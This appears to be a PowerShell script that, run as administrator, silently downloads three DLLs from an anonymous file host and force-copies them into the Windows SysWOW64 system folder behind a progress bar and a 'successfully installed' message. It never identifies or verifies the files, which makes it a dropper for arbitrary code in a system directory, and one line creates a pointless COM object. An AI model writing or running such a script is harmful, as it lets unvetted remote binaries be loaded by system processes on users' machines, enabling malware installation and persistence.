# Must be run as administrator
# Silent file downloader with progress bar to SysWOW64

Add-Type -AssemblyName PresentationFramework

# Define DLL download info (replace these URLs!)
$dlls = @(
    @{ Name = "file1.dll"; Url = "https://files.catbox.moe/77pg84.dll" },
    @{ Name = "file2.dll"; Url = "https://files.catbox.moe/enco8e.dll" },
    @{ Name = "file3.dll"; Url = "https://files.catbox.moe/jmp14d.dll" }
)

# Create a temp folder
$temp = "$env:TEMP\DLLDownloads"
New-Item -ItemType Directory -Path $temp -Force | Out-Null

# Function: Download a file with a progress bar
function Download-WithProgress {
    param (
        [string]$url,
        [string]$outFile,
        [string]$displayName
    )

    $progress = New-Object -ComObject "Microsoft.Update.AutoUpdate"
    $title = "Downloading $displayName"
    $progressWindow = New-Object System.Windows.Forms.Form
    $progressWindow.Text = $title
    $progressWindow.Width = 400
    $progressWindow.Height = 100
    $progressWindow.StartPosition = "CenterScreen"
    $progressWindow.FormBorderStyle = "FixedDialog"
    $progressWindow.ControlBox = $false

    $progressBar = New-Object System.Windows.Forms.ProgressBar
    $progressBar.Width = 350
    $progressBar.Height = 30
    $progressBar.Style = "Continuous"
    $progressBar.Minimum = 0
    $progressBar.Maximum = 100
    $progressBar.Value = 0
    $progressBar.Top = 20
    $progressBar.Left = 20
    $progressWindow.Controls.Add($progressBar)

    $progressWindow.Show()

    $webclient = New-Object System.Net.WebClient
    $webclient.DownloadProgressChanged += {
        $progressBar.Value = $_.ProgressPercentage
    }
    $webclient.DownloadFileCompleted += {
        $progressWindow.Close()
    }

    $webclient.DownloadFileAsync($url, $outFile)

    while ($webclient.IsBusy) {
        Start-Sleep -Milliseconds 200
        [System.Windows.Forms.Application]::DoEvents()
    }
}

# Load required assemblies
Add-Type -AssemblyName System.Windows.Forms

# Loop through each DLL
foreach ($dll in $dlls) {
    $outFile = Join-Path $temp $dll.Name
    Download-WithProgress -url $dll.Url -outFile $outFile -displayName $dll.Name
}

# Copy all DLLs to SysWOW64
foreach ($dll in $dlls) {
    Copy-Item -Path (Join-Path $temp $dll.Name) -Destination "C:\Windows\SysWOW64\$($dll.Name)" -Force
}

# Notify completion
[System.Windows.MessageBox]::Show("All DLLs have been installed successfully.", "Done", "OK", "Information")
